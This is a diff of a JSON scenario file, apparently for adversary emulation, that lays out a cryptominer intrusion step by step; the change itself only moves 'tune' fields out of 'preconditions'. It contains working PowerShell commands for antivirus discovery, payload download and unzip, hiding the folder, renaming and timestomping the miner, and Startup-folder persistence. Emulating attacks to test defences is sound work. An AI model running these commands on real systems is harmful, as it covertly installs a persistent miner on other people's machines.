@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "cpuminers.zip",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -91,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -102,7 +111,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -112,10 +122,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -125,10 +135,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell Get-ComputerInfo"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell Get-ComputerInfo"
             }
         },
         {
@@ -139,7 +149,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -148,10 +159,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct"
             }
         },
         {
@@ -161,13 +172,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain2",
-                    "file_name": "self.tool_name2",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "TermsHost.zip"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain2",
+                "file_name": "self.tool_name2",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "TermsHost.zip"
             }
         },
         {
@@ -177,10 +188,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\TermsHost.zip -DestinationPath C:\\Users\\Public\\TermsHost; echo 'Unzip Complete'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Expand-Archive C:\\Users\\Public\\TermsHost.zip -DestinationPath C:\\Users\\Public\\TermsHost; echo 'Unzip Complete'}"
             }
         },
         {
@@ -190,10 +201,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Remove-Item C:\\Users\\Public\\TermsHost.zip; echo 'Removed ZIP Tools'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Remove-Item C:\\Users\\Public\\TermsHost.zip; echo 'Removed ZIP Tools'}"
             }
         },
         {
@@ -203,10 +214,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$FILE=Get-Item 'C:\\Users\\Public\\TermsHost' -Force; $FILE.attributes='Hidden'; echo 'Hidden Folder Attribute modified';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$FILE=Get-Item 'C:\\Users\\Public\\TermsHost' -Force; $FILE.attributes='Hidden'; echo 'Hidden Folder Attribute modified';}"
             }
         },
         {
@@ -216,11 +227,11 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "pre_filename": "C:\\Users\\Public\\TermsHost\\minerd.exe",
-                    "post_filename": "C:\\Users\\Public\\TermsHost\\TermsHost.exe"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "pre_filename": "C:\\Users\\Public\\TermsHost\\minerd.exe",
+                "post_filename": "C:\\Users\\Public\\TermsHost\\TermsHost.exe"
             }
         },
         {
@@ -230,10 +241,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Remove-Item C:\\Users\\Public\\TermsHost\\minerd; echo 'Removed Tools'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Remove-Item C:\\Users\\Public\\TermsHost\\minerd; echo 'Removed Tools'}"
             }
         },
         {
@@ -243,10 +254,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$(GCI C:\\Users\\Public\\TermsHost\\TermsHost.exe).lastwritetime=$(Get-Date '04/25/2016 09:47 am'); echo 'success!'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$(GCI C:\\Users\\Public\\TermsHost\\TermsHost.exe).lastwritetime=$(Get-Date '04/25/2016 09:47 am'); echo 'success!'}"
             }
         },
         {
@@ -256,10 +267,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command=quser; $string=Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0];Add-Content -Path \"C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\TermsHost.bat\" \"@echo off\"; Add-Content -Path \"C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\TermsHost.bat\" \"start /min cmd.exe /c C:\\Users\\Public\\TermsHost\\TermsHost.exe -t 1 --benchmark\"; echo \"Persistence Loaded\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command=quser; $string=Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0];Add-Content -Path \"C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\TermsHost.bat\" \"@echo off\"; Add-Content -Path \"C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\TermsHost.bat\" \"start /min cmd.exe /c C:\\Users\\Public\\TermsHost\\TermsHost.exe -t 1 --benchmark\"; echo \"Persistence Loaded\"}"
             }
         },
         {
@@ -269,10 +280,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "C:\\Users\\Public\\TermsHost\\TermsHost.exe -t 1 --benchmark"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "C:\\Users\\Public\\TermsHost\\TermsHost.exe -t 1 --benchmark"
             }
         },
         {
@@ -283,7 +294,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
